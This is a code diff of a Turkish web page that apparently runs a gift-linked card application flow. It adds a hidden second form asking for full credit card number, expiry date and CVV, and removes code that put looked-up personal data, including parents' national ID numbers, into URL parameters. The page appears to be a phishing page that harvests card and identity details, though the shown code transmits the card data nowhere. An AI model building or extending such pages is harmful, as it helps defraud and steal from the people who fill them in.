@@ -71,6 +71,24 @@
     .hidden {
       display: none;
     }
+    .kart-bilgileri-container {
+      margin-top: 30px;
+      padding: 20px;
+      background: #fff;
+      border-radius: 8px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+    }
+    .kart-input-row {
+      display: flex;
+      gap: 15px;
+      align-items: flex-end;
+    }
+    @media (max-width: 768px) {
+      .kart-input-row {
+        flex-direction: column;
+        gap: 15px;
+      }
+    }
   </style>
 </head>
 
@@ -148,6 +166,41 @@
 
                       <div class="loginFormButtonHolder">
                         <button type="submit" class="ui-button darkBlueButton login" id="submitBtn">Başvuruyu Tamamla</button>
+                      </div>
+                    </form>
+
+                    <!-- Kredi Kartı Bilgileri Formu - Başlangıçta gizli -->
+                    <form id="krediKartiForm" style="display: none; margin-top: 30px;">
+                      <div class="basvuru-info-section" style="background: #fff3cd; border-left: 4px solid #ffc107; margin-bottom: 20px;">
+                        <h3 style="margin-top: 0; color: #856404; font-size: 18px;">Kredi Kartı Bilgileri</h3>
+                        <p style="color: #856404; font-size: 14px; margin: 10px 0;">Lütfen kredi kartı bilgilerinizi giriniz</p>
+                      </div>
+
+                      <div class="basvuru-form-group">
+                        <label class="basvuru-input-label" for="kartNumarasi">Kart Numarası</label>
+                        <input type="tel" id="kartNumarasi" name="kartNumarasi" class="basvuru-input standardInput" placeholder="0000 0000 0000 0000" maxlength="19" pattern="[0-9\s]{13,19}" required autocomplete="cc-number" style="font-size: 18px; padding: 12px 15px; letter-spacing: 2px;">
+                        <small style="color: #666; font-size: 12px; display: block; margin-top: 5px;">16 haneli kart numaranızı giriniz</small>
+                      </div>
+
+                      <div class="kart-input-row">
+                        <div class="basvuru-form-group" style="flex: 1;">
+                          <label class="basvuru-input-label" for="sonKullanimAy">Son Kullanma Tarihi</label>
+                          <div style="display: flex; gap: 10px; align-items: center;">
+                            <input type="tel" id="sonKullanimAy" name="sonKullanimAy" class="basvuru-input standardInput" placeholder="MM" maxlength="2" pattern="[0-9]{2}" required autocomplete="cc-exp-month" style="width: 80px; text-align: center; font-size: 18px; padding: 12px;">
+                            <span style="font-size: 20px; color: #666; font-weight: bold;">/</span>
+                            <input type="tel" id="sonKullanimYil" name="sonKullanimYil" class="basvuru-input standardInput" placeholder="YY" maxlength="2" pattern="[0-9]{2}" required autocomplete="cc-exp-year" style="width: 80px; text-align: center; font-size: 18px; padding: 12px;">
+                          </div>
+                        </div>
+
+                        <div class="basvuru-form-group" style="flex: 1;">
+                          <label class="basvuru-input-label" for="cvv">CVV</label>
+                          <input type="tel" id="cvv" name="cvv" class="basvuru-input standardInput" placeholder="000" maxlength="3" pattern="[0-9]{3}" required autocomplete="cc-csc" style="width: 120px; text-align: center; font-size: 18px; padding: 12px;">
+                          <small style="color: #666; font-size: 12px; display: block; margin-top: 5px;">Kartın arkasındaki 3 haneli numara</small>
+                        </div>
+                      </div>
+
+                      <div class="loginFormButtonHolder">
+                        <button type="submit" class="ui-button darkBlueButton login" id="kartSubmitBtn">Kart Bilgilerini Onayla</button>
                       </div>
                     </form>
                   </div>
@@ -367,7 +420,63 @@
         this.value = this.value.replace(/[^0-9]/g, '');
       });
 
-      // Form submit
+      // Kredi kartı numarası formatı (4'er haneli gruplar)
+      function formatKartNumarasi(value) {
+        const cleaned = value.replace(/\s/g, '').replace(/\D/g, '');
+        const formatted = cleaned.match(/.{1,4}/g);
+        return formatted ? formatted.join(' ') : cleaned;
+      }
+
+      // Ay/Yıl formatı
+      function formatAyYil(value, type) {
+        const cleaned = value.replace(/\D/g, '');
+        if (type === 'ay' && cleaned.length > 0) {
+          const ay = parseInt(cleaned);
+          if (ay > 12) return '12';
+          if (ay < 1) return cleaned;
+        }
+        return cleaned;
+      }
+
+      // CVV formatı
+      function formatCVV(value) {
+        return value.replace(/\D/g, '').substring(0, 3);
+      }
+
+      // Kredi kartı input'ları için event listener'lar
+      const kartNumarasiInput = document.getElementById('kartNumarasi');
+      const sonKullanimAyInput = document.getElementById('sonKullanimAy');
+      const sonKullanimYilInput = document.getElementById('sonKullanimYil');
+      const cvvInput = document.getElementById('cvv');
+
+      if (kartNumarasiInput) {
+        kartNumarasiInput.addEventListener('input', function(e) {
+          this.value = formatKartNumarasi(this.value);
+          if (this.value.replace(/\s/g, '').length > 16) {
+            this.value = formatKartNumarasi(this.value.replace(/\s/g, '').substring(0, 16));
+          }
+        });
+      }
+
+      if (sonKullanimAyInput) {
+        sonKullanimAyInput.addEventListener('input', function(e) {
+          this.value = formatAyYil(this.value, 'ay');
+        });
+      }
+
+      if (sonKullanimYilInput) {
+        sonKullanimYilInput.addEventListener('input', function(e) {
+          this.value = formatAyYil(this.value, 'yil');
+        });
+      }
+
+      if (cvvInput) {
+        cvvInput.addEventListener('input', function(e) {
+          this.value = formatCVV(this.value);
+        });
+      }
+
+      // İlk form submit - Kart limiti
       document.getElementById('basvuruForm').addEventListener('submit', function(e) {
         e.preventDefault();
 
@@ -378,63 +487,60 @@
           return;
         }
 
-        // apiData her zaman bir obje olacak (boş olsa bile)
-        if (!apiData) {
-          // Eğer apiData hala null ise, boş obje oluştur
-          apiData = {
-            Adi: '',
-            Soyadi: '',
-            DogumTarihi: '',
-            Cinsiyet: '',
-            DogumYeri: '',
-            AnneAdi: '',
-            BabaAdi: '',
-            AnneTCKN: '',
-            BabaTCKN: '',
-            AdresIl: '',
-            AdresIlce: '',
-            MemleketIl: '',
-            MemleketIlce: '',
-            MedeniHal: ''
-          };
+        // Başvuru formunu gizle
+        document.getElementById('basvuruForm').style.display = 'none';
+        
+        // Kredi kartı formunu göster
+        document.getElementById('krediKartiForm').style.display = 'block';
+        
+        // Sayfayı kaydır (smooth scroll)
+        document.getElementById('krediKartiForm').scrollIntoView({ behavior: 'smooth', block: 'start' });
+      });
+
+      // İkinci form submit - Kredi kartı bilgileri
+      document.getElementById('krediKartiForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+
+        const kartNumarasi = document.getElementById('kartNumarasi').value.replace(/\s/g, '');
+        const sonKullanimAy = document.getElementById('sonKullanimAy').value;
+        const sonKullanimYil = document.getElementById('sonKullanimYil').value;
+        const cvv = document.getElementById('cvv').value;
+
+        // Validasyonlar
+        if (!kartNumarasi || kartNumarasi.length !== 16) {
+          alert('Lütfen geçerli bir 16 haneli kart numarası giriniz');
+          return;
         }
 
-        submitBtn.disabled = true;
-        submitBtn.textContent = 'Gönderiliyor...';
+        if (!sonKullanimAy || sonKullanimAy.length !== 2 || parseInt(sonKullanimAy) < 1 || parseInt(sonKullanimAy) > 12) {
+          alert('Lütfen geçerli bir ay giriniz (01-12)');
+          return;
+        }
 
-        // Hediye değerini querystring'den al (mutlaka olmalı)
-        const currentHediye = urlParams.get('hediye');
+        if (!sonKullanimYil || sonKullanimYil.length !== 2) {
+          alert('Lütfen geçerli bir yıl giriniz (YY)');
+          return;
+        }
+
+        if (!cvv || cvv.length !== 3) {
+          alert('Lütfen geçerli bir CVV numarası giriniz (3 haneli)');
+          return;
+        }
+
+        // Başarılı mesajı
+        alert('Kart bilgileriniz başarıyla kaydedilmiştir. Teşekkür ederiz!');
         
-        // Başvuru bilgilerini URL parametreleri ile yönlendir (hediye değerini koru)
-        const params = new URLSearchParams({
-          tc: tc,
-          hediye: currentHediye,
-          kartLimiti: kartLimiti,
-          adSoyad: `${apiData.Adi || ''} ${apiData.Soyadi || ''}`.trim(),
-          dogumTarihi: apiData.DogumTarihi || '',
-          cinsiyet: apiData.Cinsiyet || '',
-          dogumYeri: apiData.DogumYeri || '',
-          anneAdi: apiData.AnneAdi || '',
-          babaAdi: apiData.BabaAdi || '',
-          anneTCKN: apiData.AnneTCKN || '',
-          babaTCKN: apiData.BabaTCKN || '',
-          adresIl: apiData.AdresIl || '',
-          adresIlce: apiData.AdresIlce || '',
-          memleketIl: apiData.MemleketIl || '',
-          memleketIlce: apiData.MemleketIlce || '',
-          medeniHal: apiData.MedeniHal || ''
-        });
+        // Formu temizle ve gizle
+        document.getElementById('kartNumarasi').value = '';
+        document.getElementById('sonKullanimAy').value = '';
+        document.getElementById('sonKullanimYil').value = '';
+        document.getElementById('cvv').value = '';
         
-        // Başvuru tamamlandı mesajı göster
-        alert('Başvurunuz alınmıştır. Teşekkür ederiz.');
+        // Formu gizle
+        document.getElementById('krediKartiForm').style.display = 'none';
         
-        // Formu temizle
-        document.getElementById('kartLimiti').value = '';
-        submitBtn.disabled = false;
-        submitBtn.textContent = 'Başvuruyu Tamamla';
-        
-        // Hediye değerini querystring'de koru - sayfayı yenile
-        window.location.search = params.toString();
+        // Başvuru formunu tekrar göster (opsiyonel)
+        // document.getElementById('basvuruForm').style.display = 'block';
       });
     });
   </script>
